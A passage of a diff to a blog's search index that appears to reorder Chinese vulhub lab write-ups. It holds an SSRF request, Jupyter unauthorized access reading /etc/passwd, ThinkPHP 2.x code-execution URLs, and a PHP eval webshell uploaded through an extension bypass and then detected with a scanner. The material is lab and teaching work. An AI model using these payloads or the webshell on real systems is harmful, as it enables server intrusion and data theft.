AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://example.com/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img data-src="https://images.gaifagafin.top/202311222300967.png" alt="返回页面" style="zoom:80%;" />
+
+<h1 id="访问重邮官网"><a href="#访问重邮官网" class="headerlink" title="访问重邮官网"></a>访问重邮官网</h1><p>只需要将上面payload的example的url改成重邮的官网，构造http请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://www.cqupt.edu.cn/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>www.google.com</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送请求，成功访问重邮官网</p>
+<img data-src="https://images.gaifagafin.top/202311222300054.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -209,8 +209,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
         <tag>漏洞</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -614,34 +614,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Jupyter Notebook 未授权访问漏洞</title>
-    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
-<ol>
-<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
-<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-
-<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
-<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
-
-<p>可以直接执行任意命令：</p>
-<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
-
-<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux_GPG加解密文件</title>
     <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
@@ -729,6 +701,34 @@
       </tags>
   </entry>
   <entry>
+    <title>Jupyter Notebook 未授权访问漏洞</title>
+    <url>/2023/11/22/Jupyter-Notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：Jupyter Notebook 未授权访问漏洞</p>
+<ol>
+<li>复现环境中的未授权访问漏洞，登录Jupyter Web管理界面，截图证明</li>
+<li>利用Jupyter Notebook控制台执行系统命令，读取&#x2F;etc&#x2F;passwd内容，提供截图</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>运行测试环境：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>运行后，访问<code>http://your-ip:8888</code>将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>选择 new -&gt; terminal 即可创建一个控制台：</p>
+<img data-src="https://images.gaifagafin.top/202311222307962.png" style="zoom:67%;" />
+
+<p>可以直接执行任意命令：</p>
+<img data-src="https://images.gaifagafin.top/202311222307718.png" style="zoom:80%;" />
+
+<h1 id="读取-etc-passwd内容"><a href="#读取-etc-passwd内容" class="headerlink" title="读取&#x2F;etc&#x2F;passwd内容"></a>读取&#x2F;etc&#x2F;passwd内容</h1><img data-src="https://images.gaifagafin.top/202311222307464.png" style="zoom:80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OpenTSDB 命令注入漏洞（CVE-2020-35476）</title>
     <url>/2023/11/11/OpenTSDB-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-35476%EF%BC%89/</url>
     <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：OpenTSDB 命令注入漏洞（CVE-2020-35476）</strong></p>
@@ -813,8 +813,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
         <tag>漏洞</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1842,8 +1842,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
         <tag>漏洞</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1892,43 +1892,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
-    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
-<ol>
-<li>复现环境中的代码执行漏洞，截图证明</li>
-<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
-<img data-src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
-<p>即可执行<code>phpinfo()</code></p>
-<img data-src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
-
-<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
-<p>但是这里单引号双引号都被过滤了</p>
-<img data-src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
-
-<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20</span><br></pre></td></tr></table></figure>
-
-<p>得到文件列表</p>
-<p><img data-src="https://images.gaifagafin.top/202311112126522.png"></p>
-<p>进入容器验证</p>
-<img data-src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
         <tag>vulhub</tag>
-        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -2002,53 +1967,8 @@
         <category>vulhub</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用河马对PHP Webshell进行查杀</title>
-    <url>/2023/11/16/%E4%BD%BF%E7%94%A8%E6%B2%B3%E9%A9%AC%E5%AF%B9PHP-Webshell%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%9D%80/</url>
-    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里我直接使用PHPStudy2018+pikachu漏洞平台构建的环境。选择Unsafe Fileupload下的client check</p>
-<img data-src="https://images.gaifagafin.top/202311162320021.png" style="zoom: 67%;" />
-
-<p>先创建一个PHP一句话木马shell.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这里如果直接上传一个shell.php文件的话，会显示上传文件不符合要求</p>
-<p>于是先将shell文件的后缀改成<code>.jpg</code>，然后burpsuite开启代理后再点击上传文件</p>
-<img data-src="https://images.gaifagafin.top/202311162320578.png" alt="抓到的数据包" style="zoom:67%;" />
-
-<p>将shell.jpg改成<code>shell.php</code>后点击发送</p>
-<img data-src="https://images.gaifagafin.top/202311162320533.png" style="zoom:67%;" />
-
-<p>页面回显文件上传成功</p>
-<img data-src="https://images.gaifagafin.top/202311162320623.png" style="zoom:80%;" />
-
-<p>用蚁剑连接，url地址是：</p>
-<p><code>http://localhost:8888/pikachu/vul/unsafeupload/uploads/shell.php</code></p>
-<img data-src="https://images.gaifagafin.top/202311162320789.png" style="zoom: 80%;" />
-
-<p>可以看到连接成功，证明已经将一句话木马上传</p>
-<img data-src="https://images.gaifagafin.top/202311162320505.png" style="zoom:67%;" />
-
-<h1 id="使用河马查杀脚本木马"><a href="#使用河马查杀脚本木马" class="headerlink" title="使用河马查杀脚本木马"></a>使用河马查杀脚本木马</h1><h2 id="安装河马"><a href="#安装河马" class="headerlink" title="安装河马"></a>安装河马</h2><p>详情见官方教程：<a href="https://www.shellpub.com/doc/hm_win_usage.html">https://www.shellpub.com/doc/hm_win_usage.html</a></p>
-<h2 id="查杀木马"><a href="#查杀木马" class="headerlink" title="查杀木马"></a>查杀木马</h2><p>进入软件点击立即扫描</p>
-<img data-src="https://images.gaifagafin.top/202311162320739.png" style="zoom: 67%;" />
-
-<p>点击添加扫描路径，将可能存在Webshell的目录添加上去，点击开始扫描</p>
-<img data-src="https://images.gaifagafin.top/202311162320607.png" style="zoom: 80%;" />
-
-<p>扫描结果如下，点击查看，正是之前上传的一句话木马</p>
-<img data-src="https://images.gaifagafin.top/202311162320240.png" style="zoom:67%;" />
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>此次实验使用了河马这款Webshell扫描工具对常见的PHP木马进行查杀，了解了这款扫描工具的使用</p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Webshell扫描</tag>
+        <tag>vulhub</tag>
       </tags>
   </entry>
   <entry>
@@ -2255,6 +2175,149 @@
       </tags>
   </entry>
   <entry>
+    <title>ThinkPHP 2.x 任意代码执行漏洞</title>
+    <url>/2023/11/11/ThinkPHP-2-x-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：ThinkPHP 2.x 任意代码执行漏洞</strong></p>
+<ol>
+<li>复现环境中的代码执行漏洞，截图证明</li>
+<li>尝试利用代码执行漏洞读取服务器Web目录下的文件列表，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>进入<code>/vulhub/thinkphp/2-rce</code>目录下，终端输入<code>docker-compose up -d</code>开启靶场容器，这里我将虚拟机5006端口映射到容器80端口，浏览器访问5006端口</p>
+<img data-src="https://images.gaifagafin.top/202311112126159.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<code>http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D</code></p>
+<p>即可执行<code>phpinfo()</code></p>
+<img data-src="https://images.gaifagafin.top/202311112126268.png" style="zoom:67%;" />
+
+<h2 id="读取服务器Web目录下的文件列表"><a href="#读取服务器Web目录下的文件列表" class="headerlink" title="读取服务器Web目录下的文件列表"></a>读取服务器Web目录下的文件列表</h2><p>根据上面漏洞复现，要想读取文件列表，首先想到system()函数，于是构造<code>http://192.168.52.130:5006/index.php?s=%2findex%2findex%2fname%2f$%7B@system(%22ls%22)%7D</code></p>
+<p>但是这里单引号双引号都被过滤了</p>
+<img data-src="https://images.gaifagafin.top/202311112126372.png" style="zoom:67%;" />
+
+<p>这是时想到PHP还有<code>var_dump()</code>函数，并且反引号似乎不会被过滤，于是构造payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://192.168.52.130:5006/index.php?s=/index/index/name/$%7B@var_dump(%60ls%60)%7D%20</span><br></pre></td></tr></table></figure>
+
+<p>得到文件列表</p>
+<p><img data-src="https://images.gaifagafin.top/202311112126522.png"></p>
+<p>进入容器验证</p>
+<img data-src="https://images.gaifagafin.top/202311112126245.png" style="zoom: 80%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
+        <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用河马对PHP Webshell进行查杀</title>
+    <url>/2023/11/16/%E4%BD%BF%E7%94%A8%E6%B2%B3%E9%A9%AC%E5%AF%B9PHP-Webshell%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%9D%80/</url>
+    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里我直接使用PHPStudy2018+pikachu漏洞平台构建的环境。选择Unsafe Fileupload下的client check</p>
+<img data-src="https://images.gaifagafin.top/202311162320021.png" style="zoom: 67%;" />
+
+<p>先创建一个PHP一句话木马shell.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里如果直接上传一个shell.php文件的话，会显示上传文件不符合要求</p>
+<p>于是先将shell文件的后缀改成<code>.jpg</code>，然后burpsuite开启代理后再点击上传文件</p>
+<img data-src="https://images.gaifagafin.top/202311162320578.png" alt="抓到的数据包" style="zoom:67%;" />
+
+<p>将shell.jpg改成<code>shell.php</code>后点击发送</p>
+<img data-src="https://images.gaifagafin.top/202311162320533.png" style="zoom:67%;" />
+
+<p>页面回显文件上传成功</p>
+<img data-src="https://images.gaifagafin.top/202311162320623.png" style="zoom:80%;" />
+
+<p>用蚁剑连接，url地址是：</p>
+<p><code>http://localhost:8888/pikachu/vul/unsafeupload/uploads/shell.php</code></p>
+<img data-src="https://images.gaifagafin.top/202311162320789.png" style="zoom: 80%;" />
+
+<p>可以看到连接成功，证明已经将一句话木马上传</p>
+<img data-src="https://images.gaifagafin.top/202311162320505.png" style="zoom:67%;" />
+
+<h1 id="使用河马查杀脚本木马"><a href="#使用河马查杀脚本木马" class="headerlink" title="使用河马查杀脚本木马"></a>使用河马查杀脚本木马</h1><h2 id="安装河马"><a href="#安装河马" class="headerlink" title="安装河马"></a>安装河马</h2><p>详情见官方教程：<a href="https://www.shellpub.com/doc/hm_win_usage.html">https://www.shellpub.com/doc/hm_win_usage.html</a></p>
+<h2 id="查杀木马"><a href="#查杀木马" class="headerlink" title="查杀木马"></a>查杀木马</h2><p>进入软件点击立即扫描</p>
+<img data-src="https://images.gaifagafin.top/202311162320739.png" style="zoom: 67%;" />
+
+<p>点击添加扫描路径，将可能存在Webshell的目录添加上去，点击开始扫描</p>
+<img data-src="https://images.gaifagafin.top/202311162320607.png" style="zoom: 80%;" />
+
+<p>扫描结果如下，点击查看，正是之前上传的一句话木马</p>
+<img data-src="https://images.gaifagafin.top/202311162320240.png" style="zoom:67%;" />
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>此次实验使用了河马这款Webshell扫描工具对常见的PHP木马进行查杀，了解了这款扫描工具的使用</p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Webshell扫描</tag>
+      </tags>
+  </entry>
+  <entry>
